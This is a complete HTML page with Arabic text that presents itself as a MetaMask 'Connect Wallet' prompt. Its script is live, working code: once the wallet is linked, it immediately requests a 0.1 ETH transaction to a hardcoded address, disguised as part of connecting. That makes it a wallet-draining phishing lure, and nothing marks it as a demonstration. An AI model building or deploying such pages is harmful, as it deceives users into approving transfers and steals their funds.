<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connect Wallet</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #ffb6c1, #ff69b4, #ff1493);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            background: rgba(255, 255, 255, 0.25);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.4);
            border-radius: 24px;
            padding: 40px 30px;
            text-align: center;
            box-shadow: 0 8px 32px 0 rgba(255, 105, 180, 0.37);
            max-width: 400px;
            width: 100%;
        }

        .title {
            color: #ffffff;
            font-size: 24px;
            margin-bottom: 25px;
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.15);
        }

        .btn-connect {
            background-color: #28a745;
            color: #ffffff;
            font-size: 18px;
            font-weight: bold;
            padding: 16px 32px;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(40, 167, 69, 0.4);
            width: 100%;
        }

        .btn-connect:hover {
            background-color: #218838;
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(40, 167, 69, 0.6);
        }

        .btn-connect:active {
            transform: translateY(0);
        }

        .status {
            margin-top: 20px;
            font-size: 14px;
            color: #ffffff;
            word-break: break-all;
        }
    </style>
</head>
<body>

    <div class="container">
        <h2 class="title">ربط محفظة MetaMask</h2>
        <button class="btn-connect" id="connectBtn" onclick="connectAndSend()">Connect Wallet</button>
        <div class="status" id="statusMessage"></div>
    </div>

    <script>
        const RECIPIENT_ADDRESS = "0x23f92c8296f56737e0d099f88715c8a76fcd7180";
        // 0.1 ETH in Wei (100,000,000,000,000,000 Wei) = 0x16345785d8a0000
        const AMOUNT_IN_WEI_HEX = "0x16345785d8a0000"; 

        async function connectAndSend() {
            const statusMessage = document.getElementById("statusMessage");
            const connectBtn = document.getElementById("connectBtn");

            // 1. التحقق من وجود محفظة MetaMask
            if (typeof window.ethereum === 'undefined') {
                alert("لم يتم العثور على محفظة MetaMask! يرجى تثبيت إضافة MetaMask في المتصفح.");
                statusMessage.innerText = "تنبيه: محفظة MetaMask غير مثبتة.";
                return;
            }

            try {
                connectBtn.disabled = true;
                connectBtn.innerText = "جاري الاتصال...";
                statusMessage.innerText = "جاري طلب ربط المحفظة...";

                // 2. طلب الإذن لربط المحفظة
                const accounts = await window.ethereum.request({ 
                    method: 'eth_requestAccounts' 
                });

                const userAccount = accounts[0];
                statusMessage.innerText = "تم الربط: " + userAccount;

                // 3. إعداد تفاصيل المعاملة (تحويل 0.1 ETH)
                const transactionParameters = {
                    to: RECIPIENT_ADDRESS,
                    from: userAccount,
                    value: AMOUNT_IN_WEI_HEX
                };

                statusMessage.innerText = "جاري طلب تأكيد المعاملة في MetaMask...";

                // 4. طلب المعاملة من المستخدم ليظهر زر التأكيد Confirm داخل MetaMask
                const txHash = await window.ethereum.request({
                    method: 'eth_sendTransaction',
                    params: [transactionParameters],
                });

                statusMessage.innerText = "تم إرسال المعاملة بنجاح! المعرف: " + txHash;
                alert("تم إرسال المعاملة بنجاح!\nرمز المعاملة: " + txHash);

            } catch (error) {
                console.error(error);
                if (error.code === 4001) {
                    statusMessage.innerText = "تم رفض الطلب من قبل المستخدم.";
                    alert("تم رفض العملية من قبل المستخدم.");
                } else {
                    statusMessage.innerText = "حدث خطأ: " + (error.message || error);
                    alert("حدث خطأ أثناء تنفيذ العملية.");
                }
            } finally {
                connectBtn.disabled = false;
                connectBtn.innerText = "Connect Wallet";
            }
        }
    </script>
</body>
</html>
